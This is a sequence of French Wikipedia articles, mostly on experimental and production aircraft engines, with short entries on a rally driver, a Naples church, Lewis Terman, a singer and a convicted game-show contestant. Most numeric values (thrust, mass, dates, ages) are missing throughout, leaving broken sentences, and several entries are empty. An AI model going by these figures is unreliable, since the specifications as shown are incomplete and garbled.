Eclipse demanda initialement que le moteur produise une poussée de , dépassant les de poussée maximale du FJX-2 de 10 %. Et ce ne fut là que la première sur la longue série de modifications qu'allait ensuite demander Eclipse tout au long de la phase de développement. Finalement, de nombreux problèmes techniques avec l'EJ22, sans-cesse aggravés par les requêtes permanentes de modifications d’"Eclipse Aviation", finirent par clouer l'avion au sol et mettre un terme définitif aux relations commerciales entre les deux constructeurs à la fin de l'année 2002. Suivant l'interruption du contrat, les travaux de développement et l'objectif de certification par la FAA furent rapidement délaissés.
Le prototype de l'Eclipse 500 a effectué son premier vol avec des EJ22 en 2002, mais il a du ensuite subir de grosses modifications afin de continuer à exister malgré l'arrêt du développement du moteur Williams. Il vole désormais avec des Pratt &amp; Whitney Canada.
Conception du moteur.
Afin de pouvoir atteindre les niveaux d'économie de carburant demandés, l'EJ22 fut conçu comme un réacteur à double flux et trois corps, possédant une soufflante, deux compresseurs axiaux et trois turbines. Il fut en conséquence bien plus compliqué à mettre au point que les moteurs précédents produits par Williams, et bien que s'étant montré impressionnant sur les bancs d'essai, le moteur se montra en fait très capricieux durant les deux années allouées à son développement.
Il était constamment victime de problèmes au démarrage, de surchauffes en fonctionnement, de casses partielles ou de défaillances de ses sous-systèmes. Si ces problèmes avaient pu finalement être résolus, lors d'un programme de développement normal, la période de développement très courte et les incessantes demandes de la société Eclipse en firent des problèmes insurmontables pour la société Williams.
Caractéristiques.
Le moteur était un réacteur à double flux triple corps dans la gamme des de poussée, avec un taux de dilution de 4 pour 1. Le diamètre de sa soufflante était de et sa masse de base était de seulement . Lors des tests de , la masse du moteur était de et disposait d'un rapport poussée/masse de .
Le compresseur haute-pression était doté de et ne pesait que (!). Le moteur était constitué de trois corps, tous les étages de compresseur et de turbine étant axiaux. Ce fut le point de départ d'une nouvelle génération de moteurs, chez Williams, dont les anciennes réalisations avaient toutes utilisé des compresseurs centrifuges suivis de turbines axiales. Le moteur était également doté d'une chambre de combustion à flux inversé (« "reverse flow" ») et d'une canalisation mélangeant les flux des gaz.
Applications.
Bien que le moteur n'ait pas dépassé le stade du développement, il était prévu qu'il équipe ultralégers de type VLJ. Avec l'arrêt du développement du moteur, deux de ces avions ont aussi été arrêtés avant leur production.

</doc>
<doc id="10579304" url="https://fr.wikipedia.org/wiki?curid=10579304" title="Štefan Svitko">
Štefan Svitko

Stefan Svitko, né le à Žaškov, est un pilote de rallye-raid et d'enduro slovaque.
En 2016, il finit deuxième du Rallye Dakar en ayant remporté une étape. Il est le premier slovaque à monter sur le podium du Dakar.

</doc>
<doc id="10579305" url="https://fr.wikipedia.org/wiki?curid=10579305" title="Williams FJ22">
Williams FJ22



</doc>
<doc id="10579306" url="https://fr.wikipedia.org/wiki?curid=10579306" title="General Electric GE36">
General Electric GE36

Le General Electric GE36 était un moteur d'avion expérimental, un hybride entre un réacteur à double flux et un turbopropulseur désigné « "propfan" », ou « "unducted fan" » (UDF), « soufflante non-carénée » en français. Il fut développé par le constructeur américain "General Electric Aircraft Engines" (depuis devenu GE Aviation).
Conception et développement.
Le programme UDF débuta en fait dès l'année 1975, en plein cœur de l'embargo exercé par les pays de l'OPEP pendant les années 1970, lors du premier choc pétrolier. Le gouvernement américain fit pression sur la NASA pour qu'elle trouve une solution viable permettant à l'aviation civile de faire face à l'envolée des prix du pétrole et, en , l'agence américaine forma l’"Intercenter Aircraft Fuel Conservation Technology Task Force" pour explorer plusieurs options, desquelles se dégagèrent deux projets principaux : Le modèle 578-DX, de Pratt &amp; Whitney/Allison, et le GE36 de General Electric.
Le , le GE36 effectua son premier essai au sol à Peebles (Ohio), deux ans seulement après que GE ait présenté son concept à la NASA. Au cours des essais suivants, il démontra sa capacité à fonctionner pendant le longues périodes à pleine puissance, avec une poussée produite supérieure à . Il effectua également d'autres tests concernant la résistance aux impacts de volatiles, au cours desquels il démontra sa solidité face à des oiseaux d'une masse de .
Bien que le moteur ait fait preuve d'une consommation spécifique de carburant extrêmement faible, le niveau du bruit en fonctionnement posait un réel problème pour les passagers présents dans la cabine de l'avion, même en installant ces moteurs à l'arrière du fuselage. Toutefois, le bruit ne fut pas considéré comme un obstacle insurmontable. D'ailleurs, des recherches actuelles tendent à démontrer que les constructeurs ont partiellement réussi à diminuer ce phénomène, en concevant des pales mieux dessinées, à grand renfort de calculs et de simulations sur ordinateur.
En fait, le problème de ce moteur ne venait pas de lui-même, ni de certaines inquiétudes pour la sécurité des vols (une pale qui casserait en vol pourrait sectionner une partie de fuselage vitale dans son élan), mais plutôt de la période à laquelle il avait été conçu. Il apparut en effet en pleine période de détente économique, après la fin de l'embargo des pays de l'OPEP, et les années 1980 firent face à une importante baisse des prix du pétrole. Dans ce contexte économique, alors moins contraignant pour les compagnies aériennes comme pour les avionneurs du monde entier, un moteur dont la conception était axée sur l'économie de carburant devint soudainement moins intéressant, et ce fut justement ce qui précipita la fin de sa carrière. Enfin, sur un plan purement visuel, le public percevait d'un mauvais œil ces moteurs, dont les hélices sonnaient irrémédiablement comme un moyen de propulsion « lent et vieillot » à leurs oreilles.
Toutefois, bien que ces moteurs n'aient pas atteint le stade de la production en série, la technologie mise au point pour leur conception, comme les pales en matériau composite à fibre de carbone, ne fut pas un effort vain. En fait, elle leur survécut et fut ensuite utilisée sur les moteurs suivants, comme les General Electric GE90 et General Electric GEnx équipant les Boeing 747, Boeing 777 et Boeing 787.
Caractéristiques.
Le GE36 utilisa comme base de développement le réacteur à double flux militaire General Electric F404, dont le flux d'échappement mélangé était diffusé à travers une turbine de puissance qui mettait en rotation deux étages de soufflante contrarotatifs de 10 et (initialement 8 et 8). La forme en cimeterre des pales des soufflantes (on parle alors d'« hélices-cimeterres ») leur permet d'opérer à des vitesses atteignant Mach 0,75, soit environ au niveau de la mer. La turbine de puissance était constituée de (initialement 6) et de guides aérodynamiques d'entrée et de sortie de turbine. Ces de turbine étaient en fait des empilements de de rotors contrarotatifs (donc 14 en tout), chaque rotor tournant dans le sens inverse de celui qui le précédait. Il n'y avait en fait aucun stator. Cette turbine a éléments contrarotatifs tournait à la moitié de la vitesse d'une turbine classique et ne nécessitait donc pas de boîtier à engrenages pour entraîner les soufflantes.
Les hélices externes, conçues par Hamilton Standard étaient désignées SR-7A et étaient dotées de pales à incidence variable. Elles étaient maintenues en position « drapeau » lorsque le moteur était arrêté, puis pivotaient doucement jusqu'à leur position normale pendant la mise en route du moteur. Le mélangeur d'échappement, partie qui réunissait les deux flux du moteur F404 servant de générateur de gaz, avait un rôle particulièrement important sur le GE36 ; il devait en-effet relier la partie turbine de puissance (entraînant les hélices) à l'échappement du F404, mais jouait aussi le rôle de support arrière pour le moteur tout entier.

</doc>
<doc id="10579307" url="https://fr.wikipedia.org/wiki?curid=10579307" title="Rolls-Royce RB.3011">
Rolls-Royce RB.3011

Le Rolls-Royce RB.3011, initialement désigné RB.2011, est un prototype de soufflante non-carénée actuellement en cours de développement par "Rolls-Royce Holdings plc". Cette conception est également désignée « "open rotor engine" ».
Conception et développement.
Le RB.3011 est conçu pour les avions de ligne d'une capacité allant de 180 à , comme par exemple les Airbus A320 et Boeing 737. Rolls-Royce a acheté la compagnie américaine Allison en 1995, et a étudié le propfan expérimental Pratt &amp; Whitney/Allison 578-DX construit pendant les années 1980.
Le moteur a été testé à l’"Aircraft Research Association" à Bedford, dans le Bedfordshire. Les tests en soufflerie ont été effectués dans les locaux de DNW à Marknesse, aux Pays-Bas. Il devrait réduire la consommation en carburant de près de 30 %. Sa certification est prévue pour 2017-2018, avec une entrée sur le marché du transport commercial située vers 2020.
Caractéristiques principales.
Le moteur est doté de deux hélices contrarotatives ("fans") sur le côté extérieur de la nacelle, une à l'avant (tractrice) et une à l'arrière (propulsive). La conception de ces deux soufflantes fait partie intégrante de la vision à long terme « 15-50 » de Rolls-Royce, qui examine plusieurs architectures différentes pour pouvoir s'implanter dans le marché des avions à . Parmi les nombreux concepts présents dans ce groupe – nommé en raison de consommations spécifiques de carburant diminuées de 15 à 50 % par rapport aux moteurs de technologie actuelle –, il existe plusieurs variantes, basées sur la technologie disponible et sa maturité technique.
Le concept de soufflante non-carénée est connu pour posséder un niveau sonore élevé, comparé aux turbofans classiques, dont le bruit est en grande partie absorbé par les carénages entourant le moteur. Sur le RB.3011, a soufflante avant est d'un diamètre plus important que celle située à l'arrière du moteur, afin d'éviter les problèmes liés aux tourbillons de turbulences créés par les extrémités des pales de la soufflante avant. Les soufflantes sont entraînées par un arbre de transmission interne au moteur "via" une boîte à engrenages épicycloïdaux, qui produit par ailleurs une importante quantité de chaleur.

</doc>
<doc id="10579309" url="https://fr.wikipedia.org/wiki?curid=10579309" title="Rolls-Royce RB.2011">
Rolls-Royce RB.2011



</doc>
<doc id="10579310" url="https://fr.wikipedia.org/wiki?curid=10579310" title="Avco/Pratt &amp; Whitney T800">
Avco/Pratt &amp; Whitney T800

L’'Avco/Pratt &amp; Whitney T800-APW (désignation de la compagnie APW34) était un turbomoteur pour hélicoptères, produit par une coentreprise entre Avco Lycoming and Pratt &amp; Whitney. Le moteur fut développé pour le programme d'hélicoptère de reconnaissance armée LHX de l’"US Army" (celui qui verra la naissance du RAH-66 "Comanche"), mais perdit face à son concurrent le LHTEC T800 en 1988

</doc>
<doc id="10579311" url="https://fr.wikipedia.org/wiki?curid=10579311" title="Monstre du lac de Tota">
Monstre du lac de Tota

Le monstre du lac de Tota désigne une créature lacustre légendaire supposée avoir vécu, dans le lac de Tota, un lac d'eau douce situé en Colombie. Il est également appelé "" (littéralement en ).

</doc>
<doc id="10579312" url="https://fr.wikipedia.org/wiki?curid=10579312" title="Ivtchenko-Progress D-136">
Ivtchenko-Progress D-136

Le D-136 est un turbomoteur de très forte puissance employé exclusivement par l'hélicoptère russe de transport lourd Mi-26 "Halo". Dépassant les de puissance, il a été conçu par l'OKB Ivtchenko-Progress, puis fabriqué par Motor Sich, en Ukraine.
Conception et développement.
Conçu à partir de la fin des années 1970 par le constructeur ukrainien Ivtchenko-Progress ZMKB, il était destiné à être employé par paires dans des hélicoptères dont la masse se situait aux alentours des . Dérivé du turbofan D-36 du même constructeur, il est en production depuis 1978. Depuis 1983, la production est assurée par Motor Sich, une autre entreprise ukrainienne.
Caractéristiques.
Éléments internes.
Comme le D-36 qui lui sert de base de développement, le D-136 est un moteur triple corps doté de nombreux modules, facilitant les interventions d'entretien et maintenance. Sur les dix modules qui constituent ce moteur, cinq sont identiques à ceux du D-36 et peuvent être permutés d'un moteur à l'autre. Selon le site du constructeur, la durée de vie d'un D-136 est de . Sa puissance au décollage est de à un régime de .
Le compresseur est divisé en deux corps : un compresseur basse-pression (BP), à six étages axiaux, suivi d'un compresseur haute-pression (HP) à sept étages, également axiaux. Sa conception est identique à celle du compresseur du D-36, à l'exception du carter intermédiaire situé entre les compresseurs BP et HP. Ce carter a pour fonction de relier le moteur à la structure de l'hélicoptère, mais joue également le rôle d'amortisseur de vibrations. L'air en provenance du compresseur est ensuite mélangé à du carburant dans la chambre de combustion annulaire, puis les gaz chauds s'échappent à travers les turbines HP et BP. Reliées à leurs compresseurs respectifs par des arbres concentriques, elles sont axiales à un étage chacune, et sont suivies par une turbine libre dite « de puissance », qui est dotée de deux étages.
L'arbre de transmission liant la turbine de puissance à la boîte à engrenages du moteur est situé à l'arrière de celui-ci, et passe à travers les cloisons de la tuyère. La boîte à engrenages réducteurs, en aluminium, ne pèse que mais peut encaisser une puissance totale de . Elle a pour particularité de ne posséder aucun engrenage à planétaires au niveau du boîtier reliant les arbres de puissance des deux moteurs au rotor principal. Le dispositif d'échappement est conçu comme une tuyère divergente et sert à réduire la vitesse des gaz et les décharger dans l'atmosphère à une assez bonne distance de l'axe du moteur.
Régulation.
Le système de contrôle du moteur fonctionne selon le principe de la régulation. En effet, le rotor d'un hélicoptère tourne à vitesse constante, de même que le moteur qui l'entraîne, avec certes un rapport de réduction entre les deux, obtenu par la boîte à engrenages réducteurs située sur le moteur (rapport de réduction de 63 pour 1 → à la turbine, convertis en rotor). Afin de pouvoir maintenir cette vitesse constante malgré les variations de puissance demandées par le pilote "via" la manette des gaz, le calculateur du moteur va calculer le dosage de carburant idéal pour compenser les pertes ou les augmentations de régimes occasionnées par les changements d'angles d'attaque des pales du rotor principal de l'hélicoptère.
Pour faire simple, lorsque le pilote va demander de la puissance, l'augmentation brutale de l'incidence des pales va augmenter leur résistance à l'avancement, et donc faire chuter le régime moteur. Le calculateur, qui veut maintenir la vitesse à une valeur constante, va donc augmenter le débit de carburant dans le moteur pour rattraper la vitesse de rotation perdue sur le rotor. À l'inverse, si le pilote relâche de la puissance, la soudaine diminution de l'incidence des pales va diminuer leur résistance à l'avancement, le rotor va accélérer et le régime moteur va dépasser sa valeur prévue. Le calculateur va donc en conséquence réduire le débit de carburant pour laisser chuter le régime et le faire revenir à la valeur prévue, dite « consigne ».
Ce principe est globalement le même pour tous les hélicoptères existants, et ne se limite pas au D-136. Sur ce dernier, la mesure de régime est effectuée au niveau de la turbine libre. Ce moteur fonctionnant toujours par paires, il est équipé d'un dispositif de sécurité qui désynchronise l'un des deux moteurs s'il est victime d'une défaillance.
Voir aussi.
Bibliographie.
Turbomoteur D-136, manuels d'entretien et documentation technique, livres 1 et 2 (en russe) :

</doc>
<doc id="10579313" url="https://fr.wikipedia.org/wiki?curid=10579313" title="Gigantocamelus">
Gigantocamelus

Gigantocamelus est un genre éteint de la famille des camélidés, ayant vécu aux États-Unis du Pliocène au Pléistocène, il y a environ 4,68 millions d'années. C'était la deuxième plus grande espèce connue de camelidés.
Liste d'espèces.
Selon :

</doc>
<doc id="10579316" url="https://fr.wikipedia.org/wiki?curid=10579316" title="Ivtchenko-Progress D-18T">
Ivtchenko-Progress D-18T

L’Ivtchenko-Progress D-18T, aussi parfois désigné Progress D-18T ou Lotarev D-18T, est un réacteur à double flux et triple corps à haut taux de dilution de forte puissance, taré à plus de de poussée et utilisé pour propulser les avions-cargos parmi les plus lourds au monde.
Conception et développement.
Le moteur fut conçu dans les années 1970 par le bureau de conception (OKB) Ivtchenko-Progress, en Ukraine (alors appartenant à l'Union soviétique), puis fut produit par Motor Sich, une autre entreprise ukrainienne, elle-aussi située à Zaporijia. D'une taille impressionnante, ce moteur fut le premier en URSS à dépasser les de poussée.
Ce moteur, dans sa version définitive, effectua son premier démarrage le , et prit l'air pour la première fois lors du premier vol de l'immense Antonov An-124, le . Les tests officiels sur banc furent achevés le . Son développement fut achevé en 1988. Sa production commerciale débuta en 1999.
Actuellement , du D-18T sont en service, ayant accumulé un total de plus d'un million d'heures de vol.
Caractéristiques.
Le D-18T est un réacteur à double flux à fort taux de dilution et doté de trois corps. Le corps BP (basse-pression) est constitué d'une soufflante mono-étage, suivie par le corps MP et le corps HP, chacun étant doté de de compresseur axiaux et amenant à la chambre de combustion annulaire un air comprimé à . Après la combustion du mélange air/carburant grâce à de carburant intégrés dans le flux des gaz et deux allumeurs, les gaz chauds sont véhiculés vers la tuyère en passant à travers les turbines HP et MP, à un étage chacune, puis la turbine BP (entraînant la soufflante), dotée de . Les turbines sont reliées à leurs compresseurs correspondants "via" des arbres concentriques indépendants tournant les uns à l'intérieur des autres (d'où l'appellation « triple corps »). Cette architecture, selon le constructeur, apporte une forte puissance au décollage mais également une grande fiabilité et un faible consommation spécifique de carburant dans tous les domaines de vol. D'autres avantages sont une maintenance facilitée, grâce notamment à une architecture modulaire (), une durée de service plutôt longue, une bonne fiabilité et de faibles émissions sonores et polluantes, qui sont d'ailleurs en accord avec les standards de l'organisation de l'aviation civile internationale (OACI).
Les premiers exemplaires ne disposaient pas d'une durée de vie très importante, certains moteurs nécessitant une révision complète après seulement de service. Les moteurs de la série 3 virent cette durée allongée à plus de , et ceux de la série 4 à environ (ou de de vol chacun).
Le moteur est également équipé d'un efficace inverseur de poussée, installé sur le carénage du flux secondaire (celui de la soufflante). Il est actionné par des vérins hydrauliques contrôlés par une unité électronique.
Le rapport poussée/masse est d'environ pour 1.
Applications.
Le D-18T fut sélectionné en 1984 pour propulser les deux plus gros avions du monde :
Évolutions et futur.
Les moteurs modulaires à trois corps sont désormais devenus l'épine dorsale pour la presque totalité des moteurs de plus de de poussée du . Les qualités dynamiques et les paramètres de cycle thermique élevés du D-18T lui permettent d'être utilisé comme cœur pour les installations de turbogénérateurs ou turboalternateurs industriels ayant des puissances sur l'arbre s'étalant de .

</doc>
<doc id="10579317" url="https://fr.wikipedia.org/wiki?curid=10579317" title="Progress D-18T">
Progress D-18T



</doc>
<doc id="10579318" url="https://fr.wikipedia.org/wiki?curid=10579318" title="Lotarev D-18T">
Lotarev D-18T



</doc>
<doc id="10579319" url="https://fr.wikipedia.org/wiki?curid=10579319" title="General Electric YJ93">
General Electric YJ93

Le General Electric YJ93 était un turboréacteur à simple flux et postcombustion, conçu comme moyen de propulsion pour le bombardier North American XB-70 Valkyrie et l'intercepteur North American XF-108 Rapier.
Conception et développement.
L'YJ93 débuta sa vie sous la désignation de General Electric X275, une version agrandie du General Electric J79. Il évolua ensuite en X279, quand la vitesse de croisière de Mach 3 devint une clause du contrat de développement du "Valkyrie", puis devint finalement l'YJ93.
Comme le moteur fut prêt plus tôt que les deux avions qu'il devait équiper, l"US Air Force" décida de le tester sur un appareil déjà existant, et un B-58A ("s/n 55-662") fut modifié par Convair à partir du , afin d'être doté d'une nacelle spéciale sous le fuselage pouvant accueillir le moteur. L'avion fut ensuite livré à la base aérienne d'Edwards, avec la désignation NB-58A. Il effectua plusieurs vols avec l'YJ93, dont plusieurs à une vitesse supérieure à . Le moteur était si puissant que lorsqu'il était allumé, le NB-58A pouvait ne pas utiliser la puissance de ses quatre J79.
L'intercepteur XF-108 fut abandonné, et le projet du B-70 fut réorienté vers un programme de recherches uniquement. Le NB-58A fut reconverti en TB-58A et vola encore, cette fois pour filmer le XB-70 pendant ses essais, puis fut détruit en 1977.
Caractéristiques.
L'YJ93 était un turboréacteur monocorps à simple flux et postcombustion, doté d'ailettes de stator à géométrie variable et d'une tuyère convergente/divergente complètement variable. La poussée maximale produite au niveau de la mer était de . Il utilisait un carburant aviation spécial pour hautes-températures, le JP-6 similaire au JP-5 mais avec un point de congélation plus bas et une meilleure stabilité à l'oxydation thermique. Les six moteurs du XB-70 étaient capables de produire un rapport poussée/masse de 5 pour 1, lui procurant une vitesse de (environ Mach 3) à une altitude de .

</doc>
<doc id="10579320" url="https://fr.wikipedia.org/wiki?curid=10579320" title="Turbomeca Piméné">
Turbomeca Piméné

Le Turbomeca Piméné était un petit turboréacteur français, conçu et produit par Turbomeca au début des années 1950. Comme les autres productions du constructeur, il tirait son nom d'un pic des Pyrénées, le pic du Piméné.
Conception et développement.
Le moteur effectua son premier démarrage en 1948, et fut présenté au public pour la première fois au salon du Bourget, en 1949. Il vola pour la première fois avec le Fouga CM.8.13 Sylphe le . Il effectua ensuite ses tests officiels en 1950.
Une version dérivée, connue sous le nom de Turbomeca Oredon, entraînait un alternateur et fut utilisée comme groupe auxiliaire de puissance sur les avions. Ce nom fut repris plus tard pour un turbomoteur équipant des hélicoptères.
Caractéristiques.
Très représentatif des turboréacteurs des débuts de la propulsion à réaction, le "Piméné" était d'une architecture très basique, avec un compresseur comprenant un étage axial suivi d'un étage centrifuge, puis d'une chambre de combustion annulaire, et enfin d'une turbine à un seul étage. Ses particularités étaient sa taille réduite et son poids très contenu, avec seulement et un diamètre de seulement .
Le taux de compression était de pour 1, et la chambre de combustion était de type annulaire avec un injecteur axial rotatif centrifuge. La turbine était constituée de et était reliée au compresseur par l'intermédiaire du corps de l'injecteur centrifuge. Elle était précédée d'un stator à refroidies par air. Le démarrage s'effectuait grâce à un moteur électrique "Air Equipement" ou à de l'air comprimé amené d'une source externe.
Sa poussée était de , soit seulement . L"'Oredon", turboalternateur dérivé du "Piméné", avait une masse de et produisait une puissance de à . L'électricité était produite en par un alternateur Alsthom.

</doc>
<doc id="10579321" url="https://fr.wikipedia.org/wiki?curid=10579321" title="Turbomeca Oredon">
Turbomeca Oredon



</doc>
<doc id="10579322" url="https://fr.wikipedia.org/wiki?curid=10579322" title="General Electric YJ101">
General Electric YJ101

Le General Electric YJ101 était un turbofan à postcombustion dans la gamme des de poussée (à sec).
Généralités.
Développé pour l'entrée du Northrop YF-17 dans la compétition "Lightweight Fighter", l'YJ101 devint la base du moteur à grand succès de General Electric, le F404.
Le taux de dilution était volontairement très faible, afin d'éviter les instabilités d'entrée d'air qui avaient été associées avec les Pratt &amp; Whitney TF30 qui équipaient le F-111. Pour des raisons de marketing, le moteur fut désigné comme un « J » (pour « jet engine », turboréacteur), alors qu'il aurait dû normalement être désigné « F » (pour « fan », de turbofan). En fait, en raison de son taux de dilution très faible (0,25 pour 1), certains ingénieurs décrivaient l'YJ101 comme un « turboréacteur à simple flux qui avait des fuites ».

</doc>
<doc id="10579325" url="https://fr.wikipedia.org/wiki?curid=10579325" title="Royales Constitutions">
Royales Constitutions



</doc>
<doc id="10579330" url="https://fr.wikipedia.org/wiki?curid=10579330" title="Église San Francesco degli Scarioni">
Église San Francesco degli Scarioni

L'église San Francesco degli Scarioni est une église conventuelle de Naples, située via Arco Mirelli. Elle est dédiée à saint François d'Assise.
Histoire.
L'église est fondée par un riche marchand de Prato, un certain Leonardo Scarioni, qui n'ayant pas d'héritiers, légua tous ses biens pour la construction d'un couvent de franciscaines pouvant accueillir soixante religieuses.
Les travaux commencent en 1704 selon les plans de Giovan Battista Nauclerio et sont achevés en 1721.
L'église et son couvent sont toujours la propriété de l'ordre franciscain.
Description.
Le couvent et son église sont des exemples notables du baroque napolitain tardif, marquant la transition vers le néo-classique. L'église est surmontée d'une coupole. Une statue de bois de saint François, datant de 1763, se dresse au-dessus du portail. 
Le maître-autel est surmonté d'un tableau de Francesco de Mura figurant "Le Christ et la Sainte Vierge concédant l'indulgence à saint François" (1773). La sacristie accueille un panneau de Marcus Laurus figurant "Le Crucifix s'adressant à saint Thomas", datant de 1580.
L'orgue baroque date de 1721.

</doc>
<doc id="10579340" url="https://fr.wikipedia.org/wiki?curid=10579340" title="Lewis Terman">
Lewis Terman

Lewis Madison Terman, né le dans le comté de Johnson (Indiana) et mort le à Palo Alto, est un psychologue américain et professeur de psychologie à la Stanford Graduate School of Education. Pionnier de la psychologie de l'éducation américaine au début du , il est surtout connu pour sa révision du test Stanford-Binet et pour ses études longitudinales concernant des enfants à haut potentiel intellectuel, "Genetic Studies of Genius".
Biographie.
Il fait ses études secondaires au Central Normal College de Danville, puis obtient une licence et un master (1903) à l'université de l'Indiana à Bloomington. Il obtient ensuite un doctorat à l'université Clark (1905). Il travaille comme directeur d'école à San Bernardino en 1905, puis il est nommé professeur à l'école normale pour enseignants de Los Angeles (1907). En 1910, il est nommé professeur de psychologie de l'éducation à l'université Stanford, sur proposition d'Ellwood Patterson Cubberley, et reste associé à l'université jusqu'à sa mort. Il y dirige notamment le département de psychologie de 1922 à 1945.
Une enquête de la "Review of General Psychology" de 2002, concernant les psychologues les plus cités du le classe à la place, ex aequo avec G. Stanley Hall.
Travaux.
Il publie la "Stanford Révision du Binet-Simon Échelle" en 1916, auquel il apporte de nouvelles modifications en 1937 puis en 1960. Il s'agit d'une adaptation du premier test, réalisé par les psychologues Alfred Binet et Théodore Simon. Terman a conçu son test Stanford-Binet comme une aide pour la classification des enfants handicapés sur le plan du développement. Le test Stanford-Binet révisé, notamment dans sa cinquième version, reste largement utilisé pour mesurer l'intelligence générale des adultes et des enfants. Le premier recours massif aux tests de QI a été effectué par Terman, durant la Première Guerre mondiale. À la différence de Binet et Simon, dont l'objectif était d'identifier les élèves dont les difficultés scolaires nécessitaient une aide spécifique, Terman envisage le recours au tests de QI dans le cadre d'une orientation professionnelle pertinente.
Terman s'est particulièrement intéressé aux enfants à haut potentiel intellectuel. Il a notamment publié, en 1922, "A New Approach to the Study of Genius". Il a également conduit une étude longitudinale sur les enfants surdoués, "Genetic Studies of Genius", à partir de 1921.
Il s'est également intéressé à l'eugénisme et a été membre de la Human Betterment Foundation.
Vie privée.
Il est le père de Frederick Terman, dont le nom est associé à la création de la Silicon Valley.

</doc>
<doc id="10579357" url="https://fr.wikipedia.org/wiki?curid=10579357" title="Prof et rebelle">
Prof et rebelle



</doc>
<doc id="10579358" url="https://fr.wikipedia.org/wiki?curid=10579358" title="Jair Picerni">
Jair Picerni

Jair Picerni est un joueur et entraîneur de football brésilien né le à São Paulo. Il jouait au poste d'arrière droit.
Biographie.
Entraîneur.
Il emmène la sélection olympique de son pays jusqu'en finale des Jeux olympiques d'été de 1984. 
Avec le Sport Recife, il est champion du Brésil en 1987.
Palmarès.
Entraîneur.
"Avec le Sport Recife :"
"Avec Gama :"
"Avec Palmeiras :"
"Avec le Brésil :"

</doc>
<doc id="10579362" url="https://fr.wikipedia.org/wiki?curid=10579362" title="José Germain (chanteur)">
José Germain (chanteur)

José Germain, né le , est un chanteur (baryton-basse) et saxophoniste français.
Biographie.
Fils du trompettiste et chef d'orchestre Georges Germain, José Germain apprend le chant, le piano, le violon et le saxophone, et monte un duo avec son frère, le compositeur, arrangeur, pianiste et chanteur Claude Germain.
Saxophoniste aux orchestres du Lido et du Moulin-Rouge, il a l'occasion d'accompagner de grandes vedettes internationales telles que Frank Sinatra ou Ella Fitzgerald lors de soirées de galas.
En remplacement définitif de Jean-Claude Briodin, il intègre en 1964 les Swingle Singers avant leur grande tournée américaine et l'enregistrement de leur troisième disque ("Swinging Mozart"), rejoignant ainsi son frère Claude et sa belle-sœur Anne Germain, cofondateurs du groupe. L'aventure du groupe dure dix ans, lui permettant de travailler avec les plus grands, tels que Leonard Bernstein, Luciano Berio, Duke Ellington, Modern Jazz Quartet
Il accompagne comme choriste de très nombreux artistes (Claude François, Gilbert Bécaud, Sheila, Pierre Bachelet, etc.), participe à la plupart des enregistrements de musiques de film de Michel Legrand comme soliste (le patron du café dans "Les Parapluies de Cherbourg)" ou choriste ("Les Demoiselles de Rochefort", "Peau d'âne", etc.) et prête sa voix à plusieurs personnages de dessins animés, dont le plus connu est certainement Scat Cat dans "Les Aristochats" (1970).

</doc>
<doc id="10579367" url="https://fr.wikipedia.org/wiki?curid=10579367" title="Progress D-436">
Progress D-436



</doc>
<doc id="10579374" url="https://fr.wikipedia.org/wiki?curid=10579374" title="Famille Babou de La Bourdaisière">
Famille Babou de La Bourdaisière



</doc>
<doc id="10579382" url="https://fr.wikipedia.org/wiki?curid=10579382" title="Christian Quesada">
Christian Quesada

Christian Quesada, né le à Antony, est un candidat de jeux télévisés.
Dans les , il fait partie des meilleurs participants à l’émission "Des chiffres et des lettres", diffusée sur Antenne 2. En 2016, il devient célèbre pour avoir été le meilleur candidat de l’émission "Les Douze Coups de midi", sur TF1, avec 193 participations et plus de de gains et de cadeaux.
À partir des années 2000, il est plusieurs fois condamné pour divers délits à caractère sexuel (notamment corruption de mineurs et détention d'images pédopornographiques).
Biographie.
Famille.
Christian Quesada est né le à Antony dans le département de la Seine (aujourd'hui dans les Hauts-de-Seine). Son père, comptable, travaille dans la logistique à la RATP et sa mère est coiffeuse.
Participation à des jeux télévisés.
Il participe à "Des chiffres et des lettres" à partir de 1986, alors âgé de . Il est à ce jour le seul joueur à avoir remporté les trois grandes épreuves télévisées : "La Coupe des champions" en 1987, les "Masters" en 1989 et "La Coupe des Clubs" en 1991, il y participe à nouveau en 2007 et 2008. Patrice Laffont, présentateur de l'émission entre 1972 à 1989, indique en 2019 l'avoir "blacklisté".
Le , il participe au "Grand Concours Spécial Champions de Jeux TV", où il est battu en finale par Khorêm Majeur, l'un des plus grands champions du jeu "Questions pour un champion".
Il participe également à l'émission "Le Plus Grand Quiz de France" en 2009 et 2011.
Le , il participe au jeu télévisé "Les Douze Coups de midi". Il est éliminé le , après et de gains et de cadeaux, un record. À l'époque, il s'agit du deuxième plus grand gagnant de l'histoire des jeux télévisés en France en termes de gains, devant un candidat de l'émission "À prendre ou à laisser" qui avait remporté en 2004, et derrière Marie, gagnante des de l'émission "Qui veut gagner des millions ?," également en 2004.
Affaires judiciaires.
Entre 2001 et 2009, Christian Quesada est condamné trois fois pour , , . En 2017, il est condamné pour tentative de proxénétisme aggravée.
Le , dans le cadre d’une enquête commencée à la fin de l’année 2017 à la suite de la plainte d'une mineure, il est mis en examen et placé en détention provisoire. Après une accusation de tentative de corruption sur mineurs, la gendarmerie décide d'inspecter ses disques durs et y trouve des milliers d’images et vidéos pédopornographiques. Il reconnaît les faits.
Dans la foulée de cette mise en cause, des internautes, dont certaines mineures au moment des faits, affirment sur les réseaux sociaux avoir reçu des propositions sexuelles de la part de Quesada. Parmi elles, Émeline, ayant affronté le quinquagénaire en 2016 dans "Les Douze Coups de midi", déclare avoir reçu de sa part plusieurs photos de son sexe lors de conversations privées. Audrey entre en contact avec Christian Quesada à l’automne 2016 , et affirme : . Comme pour Émeline, le champion du jeu de TF1 lui propose de lui envoyer une photo de son sexe tordu à la suite d'une chute. Le 17 avril 2019, une certaine Mélissa affirme, sur le plateau de l'émission "Touche pas à mon poste !", avoir été violée par Christian Quesada dans un hôtel parisien en 2017, quand elle avait ; dans le documentaire "Du rêve au cauchemar : le point sur l'affaire" (2019), Mélissa évoque une tentative.
Jean-Luc Reichmann a dit ressentir du et de la . Quesada est rayé des archives de l'émission à la suite de ces accusations.
D'après le témoignage d'un co-détenu sur TPMP, pendant sa détention, Christian Quesada pourtant serait régulièrement insulté par d’autres détenus et prendrait des médicaments pour dormir. Il .
Le , de nouvelles plaintes contre Christian Quesada sont révélées. Toutefois, le procureur de Bourg-en-Bresse appelle à la prudence dans l’attente des investigations desdites plaintes.
Son procès pour « corruption de mineures », détention et diffusion d’images pédopornographiques se tient le . Il est condamné à trois ans de prison ferme ainsi qu’à cinq ans de suivi socio-judiciaire et à une inscription au fichier des délinquants sexuels. Il est libéré en .
